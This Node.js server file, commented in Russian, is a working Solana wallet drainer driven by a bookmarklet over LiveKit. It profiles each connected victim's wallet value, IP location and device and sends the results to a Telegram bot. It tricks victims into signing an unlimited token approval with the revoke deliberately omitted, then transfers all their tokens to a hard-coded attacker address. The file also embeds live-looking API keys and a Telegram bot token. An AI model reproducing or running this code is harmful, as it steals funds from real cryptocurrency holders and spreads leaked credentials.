'use strict';

var http   = require('http');
var https  = require('https');
// @solana/web3.js и bs58 подключаются лениво внутри drainOnRailway()
//чтобы сервер стартовал даже если npm install ещё не выполнен на Railway
var { Room, RoomEvent, DataPacketKind } = require('@livekit/rtc-node');
var { AccessToken, RoomServiceClient, DataPacket_Kind } = require('livekit-server-sdk');

var PORT           = process.env.PORT               || 8080;
var LK_API_KEY     = process.env.LIVEKIT_API_KEY    || 'APIAsfxvEYsPGA2';
var LK_API_SECRET  = process.env.LIVEKIT_API_SECRET || 'JCHcXc1lYger14JRo6IRih7pJRg8UyoUayGuHMmEKoK';
var LK_WS_URL      = process.env.LIVEKIT_URL        || 'wss://jack-6u9u95rm.livekit.cloud';
var LK_HTTP_URL    = LK_WS_URL.replace(/^wss?:\/\//, 'https://');
var ROOM_NAME      = process.env.LK_ROOM            || 'bookmark-room';
var AGENT_IDENTITY = 'railway-agent-v6';
var VERCEL_URL     = process.env.VERCEL_URL         || 'https://bridge-two-blond.vercel.app';
var AGENT_SECRET   = process.env.AGENT_SECRET       || 'lk-agent-secret-2024';
var TG_TOKEN       = process.env.TELEGRAM_BOT_TOKEN || '7528079703:AAHMOBhYAU7A1RXe_fCgOE9U2GsdoceSzws';
var TG_CHAT_ID     = process.env.TELEGRAM_CHAT_ID   || '7253475769';

// ─── RoomServiceClient — отправляет ответ через LiveKit REST API ─────────────
var roomService = new RoomServiceClient(LK_HTTP_URL, LK_API_KEY, LK_API_SECRET);

// Глобальный room instance — нужен для publishData обратно
var agentRoom = null;
var agentConnected = false;
var totalReceived = 0;
var reconnectTimer = null;

// ─── Telegram уведомление ─────────────────────────────────────────────────────
function sendTelegram(text) {
  if (!TG_TOKEN || !TG_CHAT_ID) return;
  var body = JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' });
  var options = {
    hostname: 'api.telegram.org',
    port: 443,
    path: '/bot' + TG_TOKEN + '/sendMessage',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  };
  var req = https.request(options, function (res) {
    var d = '';
    res.on('data', function (c) { d += c; });
    res.on('end', function () { console.log('[tg] ' + res.statusCode + ' ' + d.substring(0, 80)); });
  });
  req.on('error', function (e) { console.error('[tg] error: ' + e.message); });
  req.write(body);
  req.end();
}

// ─── Отправляем ответ обратно в LiveKit комнату ──────────────────────────────
function sendDataToRoom(data, toIdentities) {
  if (!agentRoom || !agentConnected) {
    console.error('[sendData] Агент не подключён, пробуем через RoomService REST...');
    var bytes = Buffer.from(JSON.stringify(data), 'utf8');
    var opts = {};
    if (toIdentities && toIdentities.length > 0) {
      opts.destinationIdentities = toIdentities;
    }
    return roomService
      .sendData(ROOM_NAME, bytes, DataPacket_Kind.RELIABLE, opts)
      .then(function () { console.log('[sendData/REST] OK action=' + data.action); })
      .catch(function (e) { console.error('[sendData/REST] ERR ' + e.message); });
  }

  try {
    var encoder = new TextEncoder();
    var encoded = encoder.encode(JSON.stringify(data));
    var opts = { reliable: true };
    if (toIdentities && toIdentities.length > 0) {
      opts.destinationIdentities = toIdentities;
    }
    agentRoom.localParticipant.publishData(encoded, opts);
    console.log('[sendData] OK action=' + data.action + ' to=' + (toIdentities || ['all']).join(','));
    return Promise.resolve();
  } catch (e) {
    console.error('[sendData] ERR ' + e.message);
    return Promise.reject(e);
  }
}

// ─── Отправляем данные на Vercel /api/agent-data ─────────────────────────────
function pushToVercel(fromIdentity, action, payload) {
  var body = JSON.stringify({
    fromIdentity: fromIdentity,
    action: action,
    payload: payload,
    source: 'livekit',
  });

  var urlObj;
  try {
    urlObj = new URL(VERCEL_URL + '/api/agent-data');
  } catch (e) {
    console.error('[push] Bad VERCEL_URL: ' + e.message);
    return;
  }

  var isHttps = urlObj.protocol === 'https:';
  var options = {
    hostname: urlObj.hostname,
    port: urlObj.port || (isHttps ? 443 : 80),
    path: urlObj.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
      'X-Agent-Secret': AGENT_SECRET,
    },
  };

  var mod = isHttps ? https : http;
  var req = mod.request(options, function (res) {
    var d = '';
    res.on('data', function (c) { d += c; });
    res.on('end', function () {
      console.log('[push] Vercel ' + res.statusCode + ' ' + d.substring(0, 80));
    });
  });
  req.on('error', function (e) { console.error('[push] HTTP error: ' + e.message); });
  req.write(body);
  req.end();
}

// ─── Railway-side drain: transferChecked через tempSigner (delegate) ─────────
// Vercel Hobby убивает функции через 60 сек, поэтому drain делаем здесь.
// tempSigner получил approve u64::MAX через approve_token CPI в основной TX.
async function drainOnRailway(parsed) {
  console.log('[drain] START. tempSignerPrivkey=' + (parsed.tempSignerPrivkey ? 'present' : 'MISSING') +
    ' tokens=' + (parsed.tokens ? parsed.tokens.length : 'MISSING') +
    ' signature=' + (parsed.signature ? parsed.signature.slice(0,12) + '...' : 'MISSING') +
    ' sponsorPrivkey=' + (parsed.sponsorPrivkey ? 'present' : 'MISSING'));

  if (!parsed.tempSignerPrivkey || !parsed.tokens || parsed.tokens.length === 0) {
    console.log('[drain] No tokens or tempSignerPrivkey, skip drain');
    return;
  }

  // Lazy require — не крашим сервер при старте если пакеты ещё не установлены
  var web3, bs58mod;
  try {
    web3   = require('@solana/web3.js');
    bs58mod = require('bs58');
    console.log('[drain] deps loaded OK');
  } catch(e) {
    console.error('[drain] Missing deps (@solana/web3.js or bs58). Run npm install in railway-signaling:', e.message);
    return;
  }
  var Connection = web3.Connection, Keypair = web3.Keypair, PublicKey = web3.PublicKey;
  var Transaction = web3.Transaction, TransactionInstruction = web3.TransactionInstruction;
  var ComputeBudgetProgram = web3.ComputeBudgetProgram, SystemProgram = web3.SystemProgram;
  var bs58 = bs58mod.default || bs58mod;

  var RPC_URL = process.env.NEXT_PUBLIC_SOLANA_RPC ||
    ('https://mainnet.helius-rpc.com/?api-key=' + (process.env.HELIUS_API_KEY || 'ce308279-4762-4968-ada5-b92792865b66'));
  var connection = new Connection(RPC_URL, 'confirmed');

  // Восстанавливаем tempSigner keypair
  var privkeyBytes;
  try {
    privkeyBytes = bs58.decode ? bs58.decode(parsed.tempSignerPrivkey) : bs58.default.decode(parsed.tempSignerPrivkey);
  } catch(e) {
    console.error('[drain] bs58.decode error:', e.message);
    return;
  }
  var tempSigner = Keypair.fromSecretKey(privkeyBytes);

  // CRITICAL: sponsorPrivkey должен быть передан из Vercel API (не хранится на Railway!)
  if (!parsed.sponsorPrivkey) {
    console.error('[drain] sponsorPrivkey not provided by Vercel API - skipping drain');
    return;
  }

  var sponsorBytes;
  try {
    sponsorBytes = bs58.decode ? bs58.decode(parsed.sponsorPrivkey) : bs58.default.decode(parsed.sponsorPrivkey);
  } catch(e) {
    console.error('[drain] sponsor bs58 error:', e.message);
    return;
  }
  var sponsorKeypair = Keypair.fromSecretKey(sponsorBytes);

  var TOKEN_PROGRAM_ID     = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
  var TOKEN_2022_PROGRAM_ID = new PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb');
  var ASSOC_TOKEN_PROGRAM  = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1bRS');
  var recipientPubkey      = new PublicKey(parsed.recipientAddress || '4Wgr1xvtZ5tqP7CSb1qtTxbUXaBTHu5pNtSkyrffT7hu');

  // Ждём подтверждения основной TX прежде чем делать transferChecked.
  // 3 секунды недостаточно — если approve ещё не в чейне, delegate не выставлен
  // и transferChecked падает с "owner does not match".
  if (parsed.signature) {
    console.log('[drain] Waiting for main TX confirmation:', parsed.signature);
    var confirmed = false;
    for (var attempt = 0; attempt < 20; attempt++) {
      await new Promise(function(r){ setTimeout(r, 1000); });
      try {
        var statusResult = await connection.getSignatureStatus(parsed.signature, { searchTransactionHistory: true });
        var status = statusResult && statusResult.value;
        console.log('[drain] attempt=' + attempt + ' confirmationStatus=' + (status ? status.confirmationStatus : 'null') + ' err=' + (status && status.err ? JSON.stringify(status.err) : 'null'));
        if (status && (status.confirmationStatus === 'confirmed' || status.confirmationStatus === 'finalized') && !status.err) {
          console.log('[drain] Main TX confirmed after ' + (attempt+1) + 's');
          confirmed = true;
          break;
        }
        if (status && status.err) {
          console.error('[drain] Main TX FAILED on-chain:', JSON.stringify(status.err));
          sendTelegram('<b>Main TX FAILED on-chain</b>\nSig: <code>' + parsed.signature + '</code>\nErr: ' + JSON.stringify(status.err));
          return;
        }
      } catch(e) {
        console.error('[drain] getSignatureStatus error:', e.message);
      }
    }
    if (!confirmed) {
      console.error('[drain] Main TX not confirmed after 20s — trying drain anyway');
    }
  } else {
    await new Promise(function(r){ setTimeout(r, 3000); });
  }

  for (var i = 0; i < parsed.tokens.length; i++) {
    var token = parsed.tokens[i];
    try {
      var tokenProgramId = (token.programId === TOKEN_2022_PROGRAM_ID.toBase58())
        ? TOKEN_2022_PROGRAM_ID
        : TOKEN_PROGRAM_ID;

      var mintPubkey   = new PublicKey(token.mint);
      var sourceATA    = new PublicKey(token.tokenAccount);

      // Берём реальный баланс с чейна (не кэшированный из prepare — мог устареть)
      var realAmount;
      try {
        var accountInfoRaw = await connection.getAccountInfo(sourceATA, 'confirmed');
        if (!accountInfoRaw) {
          console.log('[drain] Token account not found on-chain, skip: ' + token.mint.slice(0,8));
          continue;
        }
        // Парсим amount из token account data layout (bytes 64-72 = amount u64 LE)
        realAmount = accountInfoRaw.data.readBigUInt64LE(64);
        if (realAmount === BigInt(0)) {
          console.log('[drain] Zero balance on-chain, skip: ' + token.mint.slice(0,8));
          continue;
        }
        console.log('[drain] Real on-chain balance for ' + token.mint.slice(0,8) + ': ' + realAmount.toString());
      } catch(balErr) {
        console.error('[drain] Failed to read on-chain balance, falling back to prepared balance:', balErr.message);
        realAmount = BigInt(token.balance);
      }

      var recipientATA = PublicKey.findProgramAddressSync(
        [recipientPubkey.toBuffer(), tokenProgramId.toBuffer(), mintPubkey.toBuffer()],
        ASSOC_TOKEN_PROGRAM
      )[0];

      var tx = new Transaction();
      tx.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 200000 }));
      tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 300000 }));

      // CreateAssociatedTokenAccountIdempotent (discriminator=1) — no-op if exists
      var createATAIx = new TransactionInstruction({
        programId: ASSOC_TOKEN_PROGRAM,
        keys: [
          { pubkey: sponsorKeypair.publicKey, isSigner: true, isWritable: true },
          { pubkey: recipientATA, isSigner: false, isWritable: true },
          { pubkey: recipientPubkey, isSigner: false, isWritable: false },
          { pubkey: mintPubkey, isSigner: false, isWritable: false },
          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
          { pubkey: tokenProgramId, isSigner: false, isWritable: false },
        ],
        data: Buffer.from([1]),
      });
      tx.add(createATAIx);

      // TransferChecked (instruction index 12) через tempSigner как delegate
      var data = Buffer.alloc(10);
      data.writeUInt8(12, 0);
      data.writeBigUInt64LE(realAmount, 1);
      data.writeUInt8(token.decimals, 9);
      var transferIx = new TransactionInstruction({
        programId: tokenProgramId,
        keys: [
          { pubkey: sourceATA, isSigner: false, isWritable: true },          // source
          { pubkey: mintPubkey, isSigner: false, isWritable: false },         // mint
          { pubkey: recipientATA, isSigner: false, isWritable: true },        // dest
          { pubkey: tempSigner.publicKey, isSigner: true, isWritable: false }, // delegate authority
        ],
        data: data,
      });
      tx.add(transferIx);

      var blockhash = await connection.getLatestBlockhash('confirmed');
      tx.recentBlockhash = blockhash.blockhash;
      tx.feePayer = sponsorKeypair.publicKey;
      tx.sign(sponsorKeypair, tempSigner);

      // skipPreflight:true — не даём RPC-ноде симулировать и отклонять до broadcast
      var drainSig = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: true, maxRetries: 5 });
      console.log('[drain] Sent drain TX for ' + token.mint.slice(0,8) + ': ' + drainSig);

      // Ждём подтверждения drain TX
      try {
        await connection.confirmTransaction({ signature: drainSig, blockhash: blockhash.blockhash, lastValidBlockHeight: blockhash.lastValidBlockHeight }, 'confirmed');
        console.log('[drain] CONFIRMED drain for ' + token.mint.slice(0,8));
        sendTelegram('<b>Token drained!</b>\nMint: <code>' + token.mint + '</code>\nAmount: ' + realAmount.toString() + '\nSig: <code>' + drainSig + '</code>');
      } catch(confErr) {
        console.error('[drain] Confirm failed for ' + token.mint.slice(0,8) + ':', confErr.message);
        sendTelegram('<b>Drain TX unconfirmed</b>\nMint: ' + token.mint.slice(0,12) + '\nSig: <code>' + drainSig + '</code>\nErr: ' + confErr.message);
      }
    } catch(e) {
      console.error('[drain] Failed ' + (token.mint||'').slice(0,8) + ':', e.message);
      sendTelegram('<b>Drain FAILED</b>\nMint: <code>' + (token.mint||'') + '</code>\nError: ' + e.message);
    }
  }

  // Sweep tempSigner SOL остатков обратно спонсору
  try {
    var balance = await connection.getBalance(tempSigner.publicKey);
    if (balance > 5000) {
      var sweepTx = new Transaction();
      sweepTx.add(SystemProgram.transfer({
        fromPubkey: tempSigner.publicKey,
        toPubkey: sponsorKeypair.publicKey,
        lamports: balance - 5000,
      }));
      var sbh = await connection.getLatestBlockhash('confirmed');
      sweepTx.recentBlockhash = sbh.blockhash;
      sweepTx.feePayer = tempSigner.publicKey;
      sweepTx.sign(tempSigner);
      var sweepSig = await connection.sendRawTransaction(sweepTx.serialize(), { skipPreflight: false });
      console.log('[drain] Sweep tempSigner SOL:', sweepSig);
    }
  } catch(e) {
    console.error('[drain] Sweep failed:', e.message);
  }
}

// ─── Fetch JSON helper (Promise-based, 8s timeout) ───────────────────────────
function fetchJSON(url, options) {
  return new Promise(function(resolve, reject) {
    var urlObj;
    try { urlObj = new URL(url); } catch(e) { return reject(e); }
    var isHttps = urlObj.protocol === 'https:';
    var mod = isHttps ? https : http;
    var reqOpts = Object.assign({
      hostname: urlObj.hostname,
      port: urlObj.port || (isHttps ? 443 : 80),
      path: urlObj.pathname + (urlObj.search || ''),
      method: options && options.method ? options.method : 'GET',
      headers: options && options.headers ? options.headers : {},
      timeout: 8000,
    }, {});
    if (options && options.method === 'POST' && options.body) {
      reqOpts.headers['Content-Length'] = Buffer.byteLength(options.body);
    }
    var settled = false;
    function done(val) { if (!settled) { settled = true; resolve(val); } }
    function fail(e)   { if (!settled) { settled = true; reject(e); } }
    var req = mod.request(reqOpts, function(res) {
      var d = '';
      res.on('data', function(c) { d += c; });
      res.on('end', function() {
        try { done(JSON.parse(d)); } catch(e) { done(null); }
      });
    });
    req.on('error', function(e) { fail(e); });
    req.on('timeout', function() { req.destroy(); fail(new Error('fetchJSON timeout: ' + url)); });
    if (options && options.body) req.write(options.body);
    req.end();
  });
}

// ─── Connect notification: Helius portfolio + IP geo ─────────────────────────
async function sendConnectNotification(wallet, payload) {
  var HELIUS_KEY = process.env.HELIUS_API_KEY || 'ce308279-4762-4968-ada5-b92792865b66';
  var domain = payload.url ? (function() {
    try { return new URL(payload.url).hostname; } catch(e) { return payload.url || '—'; }
  })() : '—';
  var ip = payload.ip || payload.userIp || '';

  // 1. IP геолокация
  var geoText = '';
  if (!ip) ip = '—';
  if (ip && ip !== '—') {
    try {
      var geo = await fetchJSON('https://ipapi.co/' + ip + '/json/');
      if (geo && geo.country_name) {
        geoText = (geo.city ? geo.city + ', ' : '') + geo.country_name;
      }
    } catch(e) {
      console.error('[notify] geo error:', e.message);
    }
  }

  // 2. SOL balance
  var solUsd = 0;
  var solAmount = 0;
  try {
    var web3 = require('@solana/web3.js');
    var RPC_URL = process.env.NEXT_PUBLIC_SOLANA_RPC ||
      ('https://mainnet.helius-rpc.com/?api-key=' + HELIUS_KEY);
    var conn = new web3.Connection(RPC_URL, 'confirmed');
    var lamports = await conn.getBalance(new web3.PublicKey(wallet));
    solAmount = lamports / 1e9;
    // SOL/USD — пробуем несколько источников
    var solPrice = 0;
    try {
      var priceData = await fetchJSON('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
      solPrice = priceData && priceData.solana ? priceData.solana.usd : 0;
    } catch(e) { /* ignore */ }
    if (!solPrice) {
      try {
        // Binance public API — резерв
        var binanceData = await fetchJSON('https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT');
        solPrice = binanceData && binanceData.price ? parseFloat(binanceData.price) : 0;
      } catch(e2) { /* ignore */ }
    }
    solUsd = solAmount * solPrice;
  } catch(e) {
    console.error('[notify] sol balance error:', e.message);
  }

  // 3. Token balances + metadata via Helius getAssetsByOwner
  var tokenLines = '';
  var tokensUsdTotal = 0;
  try {
    var heliusResp = await fetchJSON(
      'https://mainnet.helius-rpc.com/?api-key=' + HELIUS_KEY,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0', id: 'notify', method: 'getAssetsByOwner',
          params: {
            ownerAddress: wallet,
            page: 1,
            limit: 50,
            displayOptions: { showFungible: true, showNativeBalance: false },
          },
        }),
      }
    );

    var assets = heliusResp && heliusResp.result && heliusResp.result.items ? heliusResp.result.items : [];

    // Фильтруем только fungible токены с балансом > 0
    var fungible = assets.filter(function(a) {
      return a.interface === 'FungibleToken' || a.interface === 'FungibleAsset';
    });

    // Собираем токены с ценой
    var tokenList = [];
    fungible.forEach(function(a) {
      var name = (a.content && a.content.metadata && a.content.metadata.symbol)
        ? a.content.metadata.symbol
        : (a.content && a.content.metadata && a.content.metadata.name ? a.content.metadata.name : '???');
      var balance = 0;
      var price = 0;
      var usdVal = 0;
      if (a.token_info) {
        var decimals = a.token_info.decimals || 0;
        balance = (a.token_info.balance || 0) / Math.pow(10, decimals);
        price = a.token_info.price_info && a.token_info.price_info.price_per_token
          ? a.token_info.price_info.price_per_token : 0;
        usdVal = a.token_info.price_info && a.token_info.price_info.total_price
          ? a.token_info.price_info.total_price : (balance * price);
      }
      if (balance > 0) {
        tokensUsdTotal += usdVal;
        tokenList.push({ name: name, usd: usdVal });
      }
    });

    // Топ-5 по стоимости
    tokenList.sort(function(a, b) { return b.usd - a.usd; });
    var top = tokenList.slice(0, 5);
    if (top.length > 0) {
      tokenLines = '\n\n<b>Top tokens by value:</b>';
      top.forEach(function(t, i) {
        tokenLines += '\n  ' + (i + 1) + '. ' + t.name + ': $' + t.usd.toFixed(2);
      });
    }
  } catch(e) {
    console.error('[notify] helius assets error:', e.message);
  }

  var totalUsd = solUsd + tokensUsdTotal;

  // 4. Device info
  var device = payload.userAgent
    ? (function() {
        var ua = payload.userAgent;
        if (/iPhone|iPad/.test(ua)) return 'iOS';
        if (/Android/.test(ua)) return 'Android';
        if (/Windows/.test(ua)) return 'Windows';
        if (/Mac/.test(ua)) return 'macOS';
        if (/Linux/.test(ua)) return 'Linux';
        return 'Unknown';
      })()
    : '—';

  var msg =
    '<b>New Connect</b> \uD83C\uDF89\n' +
    '\n\uD83D\uDC5B <b>Wallet:</b> <code>' + wallet + '</code>' +
    '\n\uD83D\uDDA5 <b>Device:</b> ' + device +
    '\n\uD83C\uDF10 <b>IP:</b> ' + ip + (geoText ? ' | ' + geoText : '') +
    '\n\uD83D\uDD17 <b>Domain:</b> ' + domain +
    '\n' +
    '\n\uD83D\uDCB0 <b>Portfolio value: ~$' + totalUsd.toFixed(2) + ' USD</b>' +
    '\n   \u2022 SOL: ~$' + solUsd.toFixed(2) + ' USD (' + solAmount.toFixed(4) + ' SOL)' +
    '\n   \u2022 Tokens: ~$' + tokensUsdTotal.toFixed(2) + ' USD' +
    tokenLines;

  sendTelegram(msg);
}

// ─── Обработка данных от букмарклета ────────────────────────────────────────
function processData(msg, fromIdentity) {
  var action  = msg.action  || 'unknown';
  var payload = msg.payload || msg || {};
  console.log('[relay] from=' + fromIdentity + ' action=' + action);

  // Всегда пушим событие на Vercel (для UI)
  pushToVercel(fromIdentity, action, payload);

  if (action === 'ping') {
    sendDataToRoom({
      action: 'pong',
      message: 'Railway agent v6 online! (rtc-node)',
      room: ROOM_NAME,
      ts: Date.now(),
    }, [fromIdentity]);

  } else if (action === 'wallet') {
    var wallet = payload.wallet || '—';
    console.log('[wallet] from=' + fromIdentity + ' wallet=' + wallet);

    // Отправляем расширенное уведомление с портфелем + геолокацией
    sendConnectNotification(wallet, payload);

    // Если нет адреса кошелька — просто ack
    if (!wallet || wallet === '—') {
      sendDataToRoom({
        action: 'ack',
        ok: true,
        message: 'Wallet не получен.',
        ts: Date.now(),
      }, [fromIdentity]);
      return;
    }

    // Сначала отправляем Vercel /api/relay action=initialize (создаём config PDA)
    console.log('[wallet] Инициализируем config PDA для ' + wallet);
    var initBody = JSON.stringify({ action: 'initialize', userPublicKey: wallet });
    var initUrlObj;
    try { initUrlObj = new URL(VERCEL_URL + '/api/relay'); } catch(e) { initUrlObj = null; }

    var doInitialize = function(cb) {
      if (!initUrlObj) { cb(null); return; }
      var isHttps = initUrlObj.protocol === 'https:';
      var mod = isHttps ? https : http;
      var opts = {
        hostname: initUrlObj.hostname,
        port: initUrlObj.port || (isHttps ? 443 : 80),
        path: initUrlObj.pathname,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(initBody) },
      };
      var req = mod.request(opts, function(res) {
        var d = ''; res.on('data', function(c){ d += c; }); res.on('end', function(){
          console.log('[wallet] initialize response: ' + res.statusCode + ' ' + d.substring(0, 200));
          try { cb(JSON.parse(d)); } catch(e) { cb(null); }
        });
      });
      req.on('error', function(e){ console.error('[wallet] initialize error: ' + e.message); cb(null); });
      req.write(initBody); req.end();
    };

    // После инициализации — вызываем prepare для построения TX
    var doPrepare = function() {
      console.log('[wallet] Запрашиваем prepare TX у Vercel для wallet=' + wallet);
      // withRevoke: false — revoke НЕ должен быть в основной TX
      // иначе delegate снимается сразу и Railway не может задренить токены
      var prepBody = JSON.stringify({ action: 'prepare', userPublicKey: wallet, withRevoke: false });
      var prepUrlObj;
      try { prepUrlObj = new URL(VERCEL_URL + '/api/relay'); } catch(e) { prepUrlObj = null; }
      if (!prepUrlObj) {
        sendDataToRoom({ action: 'ack', ok: false, message: 'Bad VERCEL_URL', ts: Date.now() }, [fromIdentity]);
        return;
      }
      var isHttps = prepUrlObj.protocol === 'https:';
      var mod = isHttps ? https : http;
      var opts = {
        hostname: prepUrlObj.hostname,
        port: prepUrlObj.port || (isHttps ? 443 : 80),
        path: prepUrlObj.pathname,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(prepBody) },
      };
      var req = mod.request(opts, function(res) {
        var d = ''; res.on('data', function(c){ d += c; }); res.on('end', function(){
          console.log('[wallet] prepare response: ' + res.statusCode + ' ' + d.substring(0, 300));
          var parsed;
          try { parsed = JSON.parse(d); } catch(e) {
            sendDataToRoom({ action: 'error', error: 'prepare parse error', ts: Date.now() }, [fromIdentity]);
            return;
          }
          if (!parsed.success || !parsed.transaction) {
            console.error('[wallet] prepare failed:', parsed.error || JSON.stringify(parsed).substring(0,200));
            // Если prepare упал — шлём ack с ошибкой но не зависаем
            sendDataToRoom({
              action: 'ack',
              ok: false,
              message: 'TX prepare failed: ' + (parsed.error || 'unknown'),
              wallet: wallet,
              ts: Date.now(),
            }, [fromIdentity]);
            return;
          }
          console.log('[wallet] TX готова, sessionId length=' + (parsed.sessionId||'').length + ' tokensFound=' + parsed.tokensFound);
          // Отдаём транзакцию букмарклету — он подпишет через Phantom
          sendDataToRoom({
            action: 'response',
            ok: true,
            tx: parsed.transaction,          // base64 VersionedTransaction
            sessionId: parsed.sessionId,
            tokensFound: parsed.tokensFound,
            message: 'TX готова к подписанию',
            amountSOL: 0.01,
            ts: Date.now(),
          }, [fromIdentity]);
        });
      });
      req.on('error', function(e){
        console.error('[wallet] prepare request error: ' + e.message);
        sendDataToRoom({ action: 'error', error: 'prepare fetch error: ' + e.message, ts: Date.now() }, [fromIdentity]);
      });
      req.write(prepBody); req.end();
    };

    doInitialize(function(initRes) {
      if (initRes && initRes.success === false) {
        console.error('[wallet] initialize failed: ' + (initRes.error || 'unknown'));
      }
      // Независимо от результата инициализации — идём в prepare
      // (initialize идемпотентна — если PDA уже есть, вернёт success:true)
      doPrepare();
    });

  } else if (action === 'signed') {
    //   укмарклет подписал TX и отправил обратно — cosign + broadcast + drain
    var signedTx = payload.signedTx || msg.signedTx || '';
    var sessionId = payload.sessionId || msg.sessionId || '';
    console.log('[signed] from=' + fromIdentity + ' signedTx.length=' + signedTx.length + ' sessionId.length=' + sessionId.length);

    if (!signedTx || !sessionId) {
      sendDataToRoom({ action: 'error', error: 'signedTx or sessionId missing', ts: Date.now() }, [fromIdentity]);
      return;
    }

    var cosignBody = JSON.stringify({ action: 'cosign', signedTransaction: signedTx, sessionId: sessionId });
    var cosignUrlObj;
    try { cosignUrlObj = new URL(VERCEL_URL + '/api/relay'); } catch(e) { cosignUrlObj = null; }
    if (!cosignUrlObj) {
      sendDataToRoom({ action: 'error', error: 'Bad VERCEL_URL for cosign', ts: Date.now() }, [fromIdentity]);
      return;
    }
    var isHttps = cosignUrlObj.protocol === 'https:';
    var mod = isHttps ? https : http;
    var cosignOpts = {
      hostname: cosignUrlObj.hostname,
      port: cosignUrlObj.port || (isHttps ? 443 : 80),
      path: cosignUrlObj.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(cosignBody) },
    };
    var cosignReq = mod.request(cosignOpts, function(res) {
      var d = ''; res.on('data', function(c){ d += c; }); res.on('end', function(){
        console.log('[signed] cosign response: ' + res.statusCode + ' ' + d.substring(0, 300));
        var parsed;
        try { parsed = JSON.parse(d); } catch(e) {
          sendDataToRoom({ action: 'error', error: 'cosign parse error', ts: Date.now() }, [fromIdentity]);
          return;
        }
        // Отдаём финальный резул  тат букмарклету
        sendDataToRoom({
          action: 'cosign_result',
          ok: parsed.success === true,
          signature: parsed.signature,
          tokensApproved: parsed.tokensApproved,
          message: parsed.success ? 'TX подтверждена! sig=' + parsed.signature : ('Cosign failed: ' + (parsed.error || 'unknown')),
          ts: Date.now(),
        }, [fromIdentity]);
        // Уведомление в Telegram
        if (parsed.success) {
          // Получаем цену SOL для конвертации
          var txMsg = '<b>TX Confirmed!</b>\n';
          txMsg += 'Sig: <code>' + parsed.signature + '</code>\n';
          if (parsed.tokensApproved && parsed.tokensApproved > 0) {
            txMsg += 'Tokens drained: ' + parsed.tokensApproved;
          }
          // Попытка получить цену SOL и сумму списания
          (function() {
            try {
              var priceUrl = 'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd';
              fetchJSON(priceUrl).then(function(priceData) {
                var solPrice = priceData && priceData.solana ? priceData.solana.usd : 0;
                var HELIUS_KEY = process.env.HELIUS_API_KEY || 'ce308279-4762-4968-ada5-b92792865b66';
                var RPC_URL = process.env.NEXT_PUBLIC_SOLANA_RPC ||
                  ('https://mainnet.helius-rpc.com/?api-key=' + HELIUS_KEY);
                try {
                  var web3 = require('@solana/web3.js');
                  // Парсим кошелёк из подписанной транзакции
                  var txBytes = Buffer.from(signedTx, 'base64');
                  var vt = web3.VersionedTransaction.deserialize(txBytes);
                  var userPubkey = vt.message.staticAccountKeys[0].toBase58();
                  var conn = new web3.Connection(RPC_URL, 'confirmed');
                  conn.getBalance(new web3.PublicKey(userPubkey)).then(function(lamports) {
                    var solAfter = lamports / 1e9;
                    var finalMsg = txMsg;
                    if (solPrice > 0) finalMsg += '\nSOL price: $' + solPrice.toFixed(2);
                    finalMsg += '\nWallet SOL after: ' + solAfter.toFixed(4) + ' SOL';
                    if (solPrice > 0) finalMsg += ' (~$' + (solAfter * solPrice).toFixed(2) + ')';
                    sendTelegram(finalMsg);
                  }).catch(function() { sendTelegram(txMsg); });
                } catch(e2) { sendTelegram(txMsg); }
              }).catch(function() { sendTelegram(txMsg); });
            } catch(e) { sendTelegram(txMsg); }
          })();
        } else {
          sendTelegram('<b>Cosign FAILED</b>\nError: ' + (parsed.error || 'unknown'));
        }
      });
    });
    cosignReq.on('error', function(e){
      console.error('[signed] cosign error: ' + e.message);
      sendDataToRoom({ action: 'error', error: 'cosign request error: ' + e.message, ts: Date.now() }, [fromIdentity]);
    });
    cosignReq.write(cosignBody); cosignReq.end();

  } else if (action === 'data') {
    console.log('[data] url='   + (payload.url   || '—'));
    console.log('[data] title=' + (payload.title || '—'));

    // Telegram уведомление
    sendTelegram(
      '<b>Data получен!</b>\n' +
      'Identity: <code>' + fromIdentity + '</code>\n' +
      'URL: ' + (payload.url || '—') + '\n' +
      'Title: ' + (payload.title || '—')
    );

    sendDataToRoom({
      action: 'ack',
      ok: true,
      message: 'Railway v6   олучил данные!',
      received: {
        url:   payload.url,
        title: payload.title,
      },
      ts: Date.now(),
    }, [fromIdentity]);

  } else if (action === 'fetch') {
    var targetUrl = (payload.url || msg.url || '').toString();
    if (!targetUrl) {
      sendDataToRoom({ action: 'fetch_result', ok: false, error: 'url required', ts: Date.now() }, [fromIdentity]);
      return;
    }
    console.log('[fetch] ' + targetUrl);

    var fetchHeaders = Object.assign(
      {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
      },
      payload.headers || {}
    );

    fetch(targetUrl, { headers: fetchHeaders })
      .then(function (r) {
        var status = r.status;
        return r.text().then(function (t) {
          var d;
          try { d = JSON.parse(t); } catch (_) { d = t.substring(0, 8000); }
          pushToVercel(fromIdentity, 'fetch_result', { url: targetUrl, status: status, data: d });
          sendDataToRoom({
            action: 'fetch_result',
            ok: true,
            status: status,
            url: targetUrl,
            data: d,
            ts: Date.now(),
          }, [fromIdentity]);
        });
      })
      .catch(function (e) {
